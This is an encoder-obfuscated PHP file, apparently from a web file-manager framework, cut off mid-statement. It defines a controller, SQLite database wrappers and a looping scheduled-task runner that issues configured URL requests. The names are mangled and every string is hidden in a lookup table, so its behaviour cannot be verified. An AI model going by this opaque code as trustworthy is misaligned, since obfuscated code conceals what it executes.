<?php
 goto còÀõĞĞœä; FïíãŒìÈó: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ø‚Şª‚Ô =& $_SERVER[ò«¥Ê‡å]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ø‚Şª‚Ô[6]] =& $config; $this->values[$ø‚Şª‚Ô[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ø‚Şª‚Ô[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($·ğ¡¡ÆÊ) { if (1 === func_num_args()) { $this->{$·ğ¡¡ÆÊ} = new $·ğ¡¡ÆÊ(); } else { $›îã°’Â = new ReflectionClass($·ğ¡¡ÆÊ); $ƒÚï‘Úø = func_get_args(); array_shift($ƒÚï‘Úø); $this->{$·ğ¡¡ÆÊ} = $›îã°’Â->newInstanceArgs($ƒÚï‘Úø); } return $this->{$·ğ¡¡ÆÊ}; } public function routeBind($ùèŸ¼Ú, $Ï¡‰”¥, $ã§¬Õºœ = 3) { $ç·ûŸÛ× =& $_SERVER[ò«¥Ê‡å]; $ŠÑÔÏòÀ = $this->in[$ç·ûŸÛ×[9]]; $ùèŸ¼Ú = str_replace($ç·ûŸÛ×[10], $ç·ûŸÛ×[11], trim(trim($ùèŸ¼Ú, $ç·ûŸÛ×[8]), $ç·ûŸÛ×[12])); if (!$ùèŸ¼Ú || count($ŠÑÔÏòÀ) <= $ã§¬Õºœ) { return !1; } $÷„ïì¦ = !0; $ÊŠ¢ˆÚ = explode($ç·ûŸÛ×[8], $ùèŸ¼Ú); for ($Ôõá‡ÜÔ = 0; $Ôõá‡ÜÔ < count($ÊŠ¢ˆÚ); $Ôõá‡ÜÔ++) { if ($ÊŠ¢ˆÚ[$Ôõá‡ÜÔ] != $ŠÑÔÏòÀ[$ã§¬Õºœ + $Ôõá‡ÜÔ]) { $÷„ïì¦ = !1; break; } } if (!$÷„ïì¦) { return; } call_user_func_array(array($this, $Ï¡‰”¥), array()); } public function routeArgs($µ€£¨Ç = 3) { $ÉÂíó¬É = $this->in[$_SERVER[ò«¥Ê‡å][9]]; if (count($ÉÂíó¬É) <= $µ€£¨Ç) { return array(); } $£‚¾Ïñ = array(); for ($î¬şÀ„ = $µ€£¨Ç; $î¬şÀ„ < count($ÉÂíó¬É); $î¬şÀ„ += 2) { $£‚¾Ïñ[$ÉÂíó¬É[$î¬şÀ„]] = $ÉÂíó¬É[$î¬şÀ„ + 1]; $this->in[$ÉÂíó¬É[$î¬şÀ„]] = $ÉÂíó¬É[$î¬şÀ„ + 1]; } return $£‚¾Ïñ; } protected function assign($ÖÈö„Ú¬, $’Òû†å¸) { $this->values[$ÖÈö„Ú¬] = $’Òû†å¸; } protected function display($û‰”ó–¦) { ob_end_clean(); extract($this->values); require $this->tpl . $û‰”ó–¦; } } class DbSqliteBase extends Db { public function __construct($ú÷âÑÚ² = '') { $¯¤›¥öÑ =& $_SERVER[ò«¥Ê‡å]; if (!extension_loaded($¯¤›¥öÑ[13])) { think_exception(think_lang($¯¤›¥öÑ[14]) . $¯¤›¥öÑ[15]); } if (!empty($ú÷âÑÚ²)) { if (!isset($ú÷âÑÚ²[$¯¤›¥öÑ[16]])) { $ú÷âÑÚ²[$¯¤›¥öÑ[16]] = 438; } $this->config = $ú÷âÑÚ²; if (empty($this->config[$¯¤›¥öÑ[17]])) { $this->config[$¯¤›¥öÑ[17]] = array(); } } } public function connect($ô¿‘ÏÉö = '', $üÉÒşÆæ = 0) { $è³˜€ßğ =& $_SERVER[ò«¥Ê‡å]; if (!isset($this->linkID[$üÉÒşÆæ])) { if (empty($ô¿‘ÏÉö)) { $ô¿‘ÏÉö = $this->config; } $ØÜÂ®«ë = !empty($ô¿‘ÏÉö[$è³˜€ßğ[17]][$è³˜€ßğ[18]]) ? $ô¿‘ÏÉö[$è³˜€ßğ[17]][$è³˜€ßğ[18]] : $this->pconnect; $‰ˆ¾ß„ = $ØÜÂ®«ë ? $è³˜€ßğ[19] : $è³˜€ßğ[20]; $this->linkID[$üÉÒşÆæ] = $‰ˆ¾ß„($ô¿‘ÏÉö[$è³˜€ßğ[21]], $ô¿‘ÏÉö[$è³˜€ßğ[16]]); if (!$this->linkID[$üÉÒşÆæ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$üÉÒşÆæ], 30000); if (1 != think_config($è³˜€ßğ[22])) { unset($this->config); } } return $this->linkID[$üÉÒşÆæ]; } public function free() { $this->queryID = null; } public function query($›‡¶šÃ¯) { $³Ì Õ¹ç =& $_SERVER[ò«¥Ê‡å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $›‡¶šÃ¯; if ($this->queryID) { $this->free(); } think_action_status($³Ì Õ¹ç[23], 1); think_status($³Ì Õ¹ç[24]); $this->queryID = sqlite_query($this->_linkID, $›‡¶šÃ¯); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ñõ›İçª = $this->getAll(); return $Ñõ›İçª; } } public function execute($¾£¡Î±½) { $Ã¼ì„Ç =& $_SERVER[ò«¥Ê‡å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¾£¡Î±½; if ($this->queryID) { $this->free(); } think_action_status($Ã¼ì„Ç[25], 1); think_status($Ã¼ì„Ç[24]); $šıË³Œ = sqlite_exec($this->_linkID, $¾£¡Î±½); $this->debug(); if (!1 === $šıË³Œ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ò«¥Ê‡å][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $„Ãèç’¥ = sqlite_query($this->_linkID, $_SERVER[ò«¥Ê‡å][27]); if (!$„Ãèç’¥) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $İ’Ì†”… = sqlite_query($this->_linkID, $_SERVER[ò«¥Ê‡å][28]); if (!$İ’Ì†”…) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $êœ‚‡Á = array(); if ($this->numRows > 0) { for ($ç•ŠÖ« = 0; $ç•ŠÖ« < $this->numRows; $ç•ŠÖ«++) { $êœ‚‡Á[$ç•ŠÖ«] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $êœ‚‡Á; } public function getFields($ïé•Ğ·) { $Şìô±Ôİ =& $_SERVER[ò«¥Ê‡å]; $´åÚ± = $this->query($Şìô±Ôİ[29] . $ïé•Ğ· . $Şìô±Ôİ[30]); $¢Äå«“¤ = array(); if ($´åÚ±) { foreach ($´åÚ± as $Ëøßò™± => $ÓŞ˜¶¿Å) { $¢Äå«“¤[$ÓŞ˜¶¿Å[$Şìô±Ôİ[31]]] = array($Şìô±Ôİ[32] => $ÓŞ˜¶¿Å[$Şìô±Ôİ[31]], $Şìô±Ôİ[33] => $ÓŞ˜¶¿Å[$Şìô±Ôİ[34]], $Şìô±Ôİ[35] => (bool) ($ÓŞ˜¶¿Å[$Şìô±Ôİ[36]] === $Şìô±Ôİ[12]), $Şìô±Ôİ[37] => $ÓŞ˜¶¿Å[$Şìô±Ôİ[38]], $Şìô±Ôİ[39] => strtolower($ÓŞ˜¶¿Å[$Şìô±Ôİ[40]]) == $Şìô±Ôİ[41], $Şìô±Ôİ[42] => strtolower($ÓŞ˜¶¿Å[$Şìô±Ôİ[43]]) == $Şìô±Ôİ[44]); } } return $¢Äå«“¤; } public function getTables($¨•À‡’½ = '') { $Î×˜¿é =& $_SERVER[ò«¥Ê‡å]; $™şÃ¶š· = $this->query($Î×˜¿é[45] . $Î×˜¿é[46] . $Î×˜¿é[47]); $ÛÜßªæÓ = array(); foreach ($™şÃ¶š· as $õÂ·™êá => $¥½“¢£”) { $ÛÜßªæÓ[$õÂ·™êá] = current($¥½“¢£”); } return $ÛÜßªæÓ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $·šİ¶ … =& $_SERVER[ò«¥Ê‡å]; $¸™âó®¤ = sqlite_last_error($this->_linkID); $this->error = $¸™âó®¤ . $·šİ¶ …[4] . sqlite_error_string($¸™âó®¤); if ($·šİ¶ …[12] != $this->queryStr) { $this->error .= LNG($·šİ¶ …[48]) . $this->queryStr; } think_trace($this->error, $·šİ¶ …[12], $·šİ¶ …[49]); return $this->error; } public function escapeString($âî‹Å¡˜) { return sqlite_escape_string($âî‹Å¡˜); } public function parseLimit($¡Ëïİ±) { $é¬£¨·Ê =& $_SERVER[ò«¥Ê‡å]; $ÇÊ¡±İì = $é¬£¨·Ê[12]; if (!empty($¡Ëïİ±)) { $¡Ëïİ± = explode($é¬£¨·Ê[50], $¡Ëïİ±); if (count($¡Ëïİ±) > 1) { $ÇÊ¡±İì .= $é¬£¨·Ê[51] . $¡Ëïİ±[1] . $é¬£¨·Ê[52] . $¡Ëïİ±[0] . $é¬£¨·Ê[53]; } else { $ÇÊ¡±İì .= $é¬£¨·Ê[51] . $¡Ëïİ±[0] . $é¬£¨·Ê[53]; } } return $ÇÊ¡±İì; } } class DbSqlite3Base extends Db { public function __construct($½“œÉ‘À = '') { $ó‹Åá“ =& $_SERVER[ò«¥Ê‡å]; if (!class_exists($ó‹Åá“[54])) { think_exception(think_lang($ó‹Åá“[14]) . $ó‹Åá“[55]); } if (!empty($½“œÉ‘À)) { if (!isset($½“œÉ‘À[$ó‹Åá“[16]])) { $½“œÉ‘À[$ó‹Åá“[16]] = 438; } $this->config = $½“œÉ‘À; if (empty($this->config[$ó‹Åá“[17]])) { $this->config[$ó‹Åá“[17]] = array(); } } } public function connect($¢Úî –¨ = '', $Çöº˜…¿ = 0) { $§éÀ’Õç =& $_SERVER[ò«¥Ê‡å]; if (!isset($this->linkID[$Çöº˜…¿])) { if (empty($¢Úî –¨)) { $¢Úî –¨ = $this->config; } $this->linkID[$Çöº˜…¿] = new SQLite3($¢Úî –¨[$§éÀ’Õç[21]]); if (!$this->linkID[$Çöº˜…¿]) { think_exception($this->linkID[$Çöº˜…¿]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Çöº˜…¿]->busyTimeout(30000); if (1 != think_config($§éÀ’Õç[22])) { unset($this->config); } } return $this->linkID[$Çöº˜…¿]; } public function free() { $this->queryID = null; } public function query($éë¤˜Ü°) { $ÚÅ’éü =& $_SERVER[ò«¥Ê‡å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $éë¤˜Ü°; if ($this->queryID) { $this->free(); } think_action_status($ÚÅ’éü[23], 1); think_status($ÚÅ’éü[24]); $this->queryID = $this->_linkID->query($éë¤˜Ü°); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $œâÕå€Æ = $this->getAll(); $this->numRows = count($œâÕå€Æ); return $œâÕå€Æ; } } public function execute($‹è¿éÉ) { $éÃçÜçù =& $_SERVER[ò«¥Ê‡å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‹è¿éÉ; if ($this->queryID) { $this->free(); } think_action_status($éÃçÜçù[25], 1); think_status($éÃçÜçù[24]); $˜ŠáßãÄ = $this->_linkID->exec($‹è¿éÉ); $this->debug(); if (!1 === $˜ŠáßãÄ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ò«¥Ê‡å][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÀŒ€²ó = $this->_linkID->query($_SERVER[ò«¥Ê‡å][27]); if (!$ÀŒ€²ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÍŞ„öñş = $this->_linkID->query($_SERVER[ò«¥Ê‡å][28]); if (!$ÍŞ„öñş) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $æÓºİ = array(); while ($Ÿø°ª£ğ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $æÓºİ[] = $Ÿø°ª£ğ; } $this->queryID->reset(); return $æÓºİ; } public function getFields($°–¼‹”˜) { $¦Äíâòğ =& $_SERVER[ò«¥Ê‡å]; $ü¡çª¨õ = $this->query($¦Äíâòğ[29] . $°–¼‹”˜ . $¦Äíâòğ[30]); $ÕòµÓ¡ˆ = array(); if ($ü¡çª¨õ) { foreach ($ü¡çª¨õ as $ì’¨Ì›ó => $‘Ò¥ÈÊ¸) { $ÕòµÓ¡ˆ[$‘Ò¥ÈÊ¸[$¦Äíâòğ[32]]] = array($¦Äíâòğ[32] => $‘Ò¥ÈÊ¸[$¦Äíâòğ[32]], $¦Äíâòğ[33] => $‘Ò¥ÈÊ¸[$¦Äíâòğ[33]], $¦Äíâòğ[35] => (bool) ($‘Ò¥ÈÊ¸[$¦Äíâòğ[35]] === $¦Äíâòğ[12]), $¦Äíâòğ[37] => $‘Ò¥ÈÊ¸[$¦Äíâòğ[56]], $¦Äíâòğ[39] => (bool) $‘Ò¥ÈÊ¸[$¦Äíâòğ[57]], $¦Äíâòğ[42] => (bool) $‘Ò¥ÈÊ¸[$¦Äíâòğ[57]]); } } return $ÕòµÓ¡ˆ; } public function getTables($‘©‹Èº» = '') { $Ø½†çÄ =& $_SERVER[ò«¥Ê‡å]; $çºàÇ² = $this->query($Ø½†çÄ[45] . $Ø½†çÄ[46] . $Ø½†çÄ[47]); $êÄ¡á«È = array(); foreach ($çºàÇ² as $¥’ÈÒÒ => $ë½Ãòğ£) { $êÄ¡á«È[$¥’ÈÒÒ] = current($ë½Ãòğ£); } return $êÄ¡á«È; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $©şÆ–Á¸ =& $_SERVER[ò«¥Ê‡å]; $this->error = $this->_linkID->lastErrorMsg(); if ($©şÆ–Á¸[12] != $this->queryStr) { $this->error .= LNG($©şÆ–Á¸[48]) . $this->queryStr; } think_trace($this->error, $©şÆ–Á¸[12], $©şÆ–Á¸[49]); return $this->error; } public function escapeString($üı¡ş¾ã) { $¬£âó·ß =& $_SERVER[ò«¥Ê‡å]; if ($this->_linkID) { return $this->_linkID->escapeString($üı¡ş¾ã); } return str_ireplace($¬£âó·ß[58], $¬£âó·ß[59], $üı¡ş¾ã); } public function parseLimit($·¥–±Š®) { $‰ØìâòÁ =& $_SERVER[ò«¥Ê‡å]; $êÚÉÂ»’ = $‰ØìâòÁ[12]; if (!empty($·¥–±Š®)) { $·¥–±Š® = explode($‰ØìâòÁ[50], $·¥–±Š®); if (count($·¥–±Š®) > 1) { $êÚÉÂ»’ .= $‰ØìâòÁ[51] . $·¥–±Š®[1] . $‰ØìâòÁ[52] . $·¥–±Š®[0] . $‰ØìâòÁ[53]; } else { $êÚÉÂ»’ .= $‰ØìâòÁ[51] . $·¥–±Š®[0] . $‰ØìâòÁ[53]; } } return $êÚÉÂ»’; } } goto D¬å¤˜»ƒ; aŠ©¨Ï†: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $É‘‚Ş =& $_SERVER[ò«¥Ê‡å]; if (self::valueGet($É‘‚Ş[789]) != $É‘‚Ş[90]) { return; } if (self::valueGet($É‘‚Ş[1651]) == $É‘‚Ş[90]) { $¦ïÖé² = self::valueGet($É‘‚Ş[1652]); if (time() - $¦ïÖé² > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($É‘‚Ş[1651], $É‘‚Ş[90]); self::log($É‘‚Ş[1653] . ACTION . $É‘‚Ş[1654]); Hook::bind($É‘‚Ş[1655], $É‘‚Ş[1656]); $êƒŠ€§ = 0; while (!0) { self::cacheClear(); if (self::valueGet($É‘‚Ş[789]) != $É‘‚Ş[90]) { self::valueSet($É‘‚Ş[1651], $É‘‚Ş[214]); self::log($É‘‚Ş[1657]); die; } $¦ïí„Üù = time(); if ($¦ïí„Üù - $êƒŠ€§ >= 60) { self::valueSet(array($É‘‚Ş[1651] => $É‘‚Ş[90], $É‘‚Ş[1652] => $¦ïí„Üù)); $êƒŠ€§ = $¦ïí„Üù; } if (!file_exists(USER_SYSTEM . $É‘‚Ş[1658])) { self::valueSet(array($É‘‚Ş[1651] => $É‘‚Ş[214], $É‘‚Ş[789] => $É‘‚Ş[214])); self::log($É‘‚Ş[1659]); die; } $¾‹ˆ°é¡ = file_get_contents(BASIC_PATH . $É‘‚Ş[1660]); $²ï¾Ñ¬ = KOD_VERSION . $É‘‚Ş[10] . KOD_VERSION_BUILD; $¥’„½„ = match_text($¾‹ˆ°é¡, $É‘‚Ş[1661]) . $É‘‚Ş[10] . match_text($¾‹ˆ°é¡, $É‘‚Ş[1662]); if ($¥’„½„ != $²ï¾Ñ¬) { self::restart(); self::log("\163\x74\157\x70\x65\x64\56\x5b\x76\145\x72\x73\151\x6f\156\x20\x75\x70\x64\x61\x74\x65\x3b{$versionNow}\x20\x3d\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Æò¦´¨ñ =& $_SERVER[ò«¥Ê‡å]; http_close(); $GLOBALS[$Æò¦´¨ñ[1663]] = 1; $_SERVER[$Æò¦´¨ñ[1664]] = $Æò¦´¨ñ[1665]; $_COOKIE = array(); $GLOBALS[$Æò¦´¨ñ[1666]] = 1; $GLOBALS[$Æò¦´¨ñ[1667]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $È¹¦æÁ¾ =& $_SERVER[ò«¥Ê‡å]; http_close(); self::valueSet($È¹¦æÁ¾[789], $È¹¦æÁ¾[214]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($È¹¦æÁ¾[1651] => $È¹¦æÁ¾[214], $È¹¦æÁ¾[789] => $È¹¦æÁ¾[90])); self::log($È¹¦æÁ¾[1668]); } public static function taskSwitch() { $ÁúÚ‚Ëß =& $_SERVER[ò«¥Ê‡å]; $–ºò¶õ¯ = self::valueGet($ÁúÚ‚Ëß[789]) == $ÁúÚ‚Ëß[90] ? $ÁúÚ‚Ëß[214] : $ÁúÚ‚Ëß[90]; self::valueSet($ÁúÚ‚Ëß[789], $–ºò¶õ¯); } public static function shutdownEvent() { $„¼êƒ¶¸ =& $_SERVER[ò«¥Ê‡å]; self::valueSet($„¼êƒ¶¸[1651], $„¼êƒ¶¸[214]); self::log($„¼êƒ¶¸[1669]); } public static function config($ë³ú‘ş‚, $Ø±¶Åí¬) { self::valueSet($_SERVER[ò«¥Ê‡å][789], $ë³ú‘ş‚); } private static function taskRunAll() { $Æ…Òœ =& $_SERVER[ò«¥Ê‡å]; $µÂšÉåå = timeFloat(); $‡¢€¿æÁ = Model($Æ…Òœ[1670])->listData(); $®àëºü× = count($‡¢€¿æÁ); for ($Ÿá©ù–Ë = 0; $Ÿá©ù–Ë < $®àëºü×; $Ÿá©ù–Ë++) { $ó û‰ = $‡¢€¿æÁ[$Ÿá©ù–Ë]; if (!$ó û‰[$Æ…Òœ[445]] || $ó û‰[$Æ…Òœ[1671]] != $Æ…Òœ[90]) { continue; } if (!self::taskTimeCheck($ó û‰)) { continue; } self::taskRun($ó û‰); } Hook::trigger($Æ…Òœ[1672]); self::taskQueueRun($µÂšÉåå); } private static function taskQueueRun($¬±·¹óó) { $°»™·Ş¤ = 10; while (!0) { $ª¥©šóç = TaskQueue::run(); if ($ª¥©šóç === !1) { break; } if (timeFloat() - $¬±·¹óó >= $°»™·Ş¤) { break; } } } private static function taskTimeCheck($â¦ÎËÓ) { $£Š¨ÖÂ =& $_SERVER[ò«¥Ê‡å]; $ÈÈèÅÕº = json_decode($â¦ÎËÓ[$£Š¨ÖÂ[196]], !0); $˜ôäë´Ó = intval($â¦ÎËÓ[$£Š¨ÖÂ[1652]]); $¼Ô ‘‹° = strtotime($£Š¨ÖÂ[1673] . $ÈÈèÅÕº[$£Š¨ÖÂ[1674]] . $£Š¨ÖÂ[1675]) - strtotime($£Š¨ÖÂ[1676]); $ÖñÈ¸Šå = time() - strtotime(date($£Š¨ÖÂ[1677]) . $£Š¨ÖÂ[1678]); $ê—ÃÅ¡Ì = $ÖñÈ¸Šå >= $¼Ô ‘‹° && $ÖñÈ¸Šå <= $¼Ô ‘‹° + 3600; switch ($ÈÈèÅÕº[$£Š¨ÖÂ[33]]) { case $£Š¨ÖÂ[1679]: if (time() - $˜ôäë´Ó < 3600 * 24 * 30) { return !1; } if ($ÈÈèÅÕº[$£Š¨ÖÂ[1679]] == date($£Š¨ÖÂ[1680]) && $ê—ÃÅ¡Ì) { return !0; } break; case $£Š¨ÖÂ[1681]: if (time() - $˜ôäë´Ó < 3600 * 24 * 7) { return !1; } $äŒ•¨¬º = date($£Š¨ÖÂ[1682]) == 0 ? 7 : date($£Š¨ÖÂ[1682]); if ($ÈÈèÅÕº[$£Š¨ÖÂ[1681]] == $äŒ•¨¬º && $ê—ÃÅ¡Ì) { return !0; } break; case $£Š¨ÖÂ[1674]: if (time() - $˜ôäë´Ó < 3600 * 24) { return !1; } if ($ê—ÃÅ¡Ì) { return !0; } break; case $£Š¨ÖÂ[1683]: if (time() - $˜ôäë´Ó >= floatval($ÈÈèÅÕº[$£Š¨ÖÂ[1683]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $‰­ĞºÛò =& $_SERVER[ò«¥Ê‡å]; static $›×Ş›´Ä = 0; $ë©£ƒ©¡ = 300; if (!$›×Ş›´Ä) { $›×Ş›´Ä = time(); } if (time() - $›×Ş›´Ä < $ë©£ƒ©¡) { return; } $›×Ş›´Ä = time(); $åçŞç› = Model($‰­ĞºÛò[548])->db($‰­ĞºÛò[12]); if ($åçŞç›) { $åçŞç›->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($‰­ĞºÛò[1684], $‰­ĞºÛò[1685]); die; } } public static function taskRun($å“¡‹ô¯) { $¿²À€İß =& $_SERVER[ò«¥Ê‡å]; self::log($¿²À€İß[1686] . $å“¡‹ô¯[$¿²À€İß[445]] . $¿²À€İß[1687] . $å“¡‹ô¯[$¿²À€İß[32]] . $¿²À€İß[1688] . $å“¡‹ô¯[$¿²À€İß[1689]]); Model($¿²À€İß[1670])->run($å“¡‹ô¯[$¿²À€İß[445]]); $µÒÈ… Ú = timeFloat(); $éÆÙöî» = $¿²À€İß[12]; switch ($å“¡‹ô¯[$¿²À€İß[33]]) { case $¿²À€İß[353]: $æâÏÅ = url_request($å“¡‹ô¯[$¿²À€İß[1689]], $¿²À€İß[247], !1, !1, !1, !1, 10); if ($æâÏÅ[$¿²À€İß[789]]) { $éÆÙöî» = strlen($æâÏÅ[$¿²À€İß[1249]]); } break; case $¿²À€İß[246]: $éÆÙöî» = Hook::apply($å“¡‹ô¯[$¿²À€İß[1689]]); default: break; } Model($¿²À€İß[1690])->add(array($¿²À€İß[1691] => $¿²À€İß[12], $¿²À€İß[1692] => $¿²À€İß[214], $¿²À€İß[33] => $¿²À€İß[1693] . $å“¡‹ô¯[$¿²À€İß[445]], $¿²À€İß[1694] => json_encode(array($¿²À€İß[32] => $å“¡‹ô¯[$¿²À€İß[32]], $¿²À€İß[1695] => timeFloat() - $µÒÈ… Ú, $¿²À€İß[339] => $éÆÙöî»)))); $ìÀßÍ¹Ô = $éÆÙöî» ? $¿²À€İß[1696] . $éÆÙöî» : $¿²À€İß[12]; self::log($¿²À€İß[1697] . $å“¡‹ô¯[$¿²À€İß[445]] . $¿²À€İß[167] . $ìÀßÍ¹Ô); return !0; } public static function valueGet($Øûì×ÊÖ) { $ÄıŠË¨ø =& $_SERVER[ò«¥Ê‡å]; $ïİáŠæ‹ = $ÄıŠË¨ø[1698]; $Ô‚«Ó×¨ = Model($ÄıŠË¨ø[478])->get($Øûì×ÊÖ, $ïİáŠæ‹); if (is_null($Ô‚«Ó×¨)) { Model($ÄıŠË¨ø[478])->set($ÄıŠË¨ø[789], $ÄıŠË¨ø[90], $ïİáŠæ‹); Model($ÄıŠË¨ø[478])->set($ÄıŠË¨ø[1651], $ÄıŠË¨ø[214], $ïİáŠæ‹); $Ô‚«Ó×¨ = Model($ÄıŠË¨ø[478])->get($Øûì×ÊÖ, $ïİáŠæ‹); } return $Ô‚«Ó×¨; } private static function valueSet($®·Ó¼É, $ÊÉûŠÅ´ = false) { $à°¬Äû¬ =& $_SERVER[ò«¥Ê‡å]; $Ùúõçï = $à°¬Äû¬[1699]; CacheLock::lock($Ùúõçï); $–ñ”ãûÇ = Model($à°¬Äû¬[478])->set($®·Ó¼É, $ÊÉûŠÅ´, $à°¬Äû¬[1698]); CacheLock::unlock($Ùúõçï); return $–ñ”ãûÇ; } protected static function log($áäÃİ§) { write_log($áäÃİ§, $_SERVER[ò«¥Ê‡å][1685]); } private static function cacheClear() { $ñº”˜û“ =& $_SERVER[ò«¥Ê‡å]; Cache::clearMemory(Model($ñº”˜û“[478])->cacheKey($ñº”˜û“[1698])); Cache::clearMemory(Model($ñº”˜û“[478])->cacheKey($ñº”˜û“[1700])); Model($ñº”˜û“[1670])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\156\147"; const STATYS_KILL = "\153\x69\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($‡àÓÏ‚÷, $œÖ®Ûç = '', $üû¯£õê = 0, $ó§ç²ù» = '') { $ÕĞú­ê° =& $_SERVER[ò«¥Ê‡å]; if (self::get($‡àÓÏ‚÷)) { return; } $this->task = array($ÕĞú­ê°[445] => $‡àÓÏ‚÷, $ÕĞú­ê°[1701] => USER_ID, $ÕĞú­ê°[1591] => $ó§ç²ù», $ÕĞú­ê°[496] => $ÕĞú­ê°[12], $ÕĞú­ê°[33] => $œÖ®Ûç, $ÕĞú­ê°[1111] => $ÕĞú­ê°[12], $ÕĞú­ê°[825] => $üû¯£õê, $ÕĞú­ê°[1702] => 0, $ÕĞú­ê°[1703] => 0, $ÕĞú­ê°[1704] => 0, $ÕĞú­ê°[1705] => timeFloat(), $ÕĞú­ê°[1706] => 0, $ÕĞú­ê°[1707] => 0, $ÕĞú­ê°[1708] => 0, $ÕĞú­ê°[1709] => 0, $ÕĞú­ê°[789] => $ÕĞú­ê°[1651]); $GLOBALS[$ÕĞú­ê°[1710]] = 1; Hook::bind($ÕĞú­ê°[1655], array($this, $ÕĞú­ê°[1711])); Hook::bind($ÕĞú­ê°[1712], array($this, $ÕĞú­ê°[1713])); $this->startAfter(); Hook::trigger($ÕĞú­ê°[1714], $this->task); $this->task[$ÕĞú­ê°[1707]] = timeFloat(); } public function end($òà—Ë = '') { $ãøüëÉÜ =& $_SERVER[ò«¥Ê‡å]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ãøüëÉÜ[1707]]) { self::valueSet($this->task[$ãøüëÉÜ[445]], !1); } $this->isEnd = !0; if ($òà—Ë) { $this->task[$ãøüëÉÜ[496]] = $òà—Ë; } self::log($ãøüëÉÜ[1715] . $this->task[$ãøüëÉÜ[445]] . $ãøüëÉÜ[1716] . sprintf($ãøüëÉÜ[897], timeFloat() - $this->task[$ãøüëÉÜ[1705]]) . $ãøüëÉÜ[1717]); Hook::unbind($ãøüëÉÜ[1655], array($this, $ãøüëÉÜ[1711])); Hook::unbind($ãøüëÉÜ[1712], array($this, $ãøüëÉÜ[1713])); $this->endAfter(); $†æ¢¾ƒ¿ = $this->task; $this->task = !1; Hook::trigger($ãøüëÉÜ[1718], $†æ¢¾ƒ¿); } public function update($×ƒÍíÚœ = 0, $¿÷¡×şµ = false) { $ìŞîŒĞ =& $_SERVER[ò«¥Ê‡å]; $íÄæã =& $this->task; if (!$íÄæã) { return; } $íÄæã[$ìŞîŒĞ[1702]] += $×ƒÍíÚœ; $íÄæã[$ìŞîŒĞ[1706]] = timeFloat(); if ($íÄæã[$ìŞîŒĞ[825]]) { if ($íÄæã[$ìŞîŒĞ[825]] < $íÄæã[$ìŞîŒĞ[1702]]) { $íÄæã[$ìŞîŒĞ[825]] = $íÄæã[$ìŞîŒĞ[1702]]; } $·‹å¹„í = timeFloat() - $íÄæã[$ìŞîŒĞ[1705]] - $íÄæã[$ìŞîŒĞ[1708]]; if ($·‹å¹„í <= 0) { $·‹å¹„í = 0.001; } $íÄæã[$ìŞîŒĞ[1703]] = $íÄæã[$ìŞîŒĞ[1702]] / $íÄæã[$ìŞîŒĞ[825]]; $íÄæã[$ìŞîŒĞ[1704]] = $íÄæã[$ìŞîŒĞ[1702]] / $·‹å¹„í; if ($íÄæã[$ìŞîŒĞ[1703]] > 0) { $íÄæã[$ìŞîŒĞ[1709]] = $·‹å¹„í * (1 - $íÄæã[$ìŞîŒĞ[1703]]) / $íÄæã[$ìŞîŒĞ[1703]]; } $íÄæã[$ìŞîŒĞ[1709]] = $íÄæã[$ìŞîŒĞ[1709]] <= 0 ? 0 : $íÄæã[$ìŞîŒĞ[1709]]; } $this->updateAfter(); $ÀéñÈß = 0.2; if (timeFloat() - $íÄæã[$ìŞîŒĞ[1707]] < $ÀéñÈß && !$¿÷¡×şµ) { return; } $ëØñ¨Àİ = self::get($íÄæã[$ìŞîŒĞ[445]]); $÷ø«äÁ = $ëØñ¨Àİ[$ìŞîŒĞ[789]]; if ($÷ø«äÁ == self::STATYS_KILL) { $¤Óìö¨ô = array($ìŞîŒĞ[1719] => 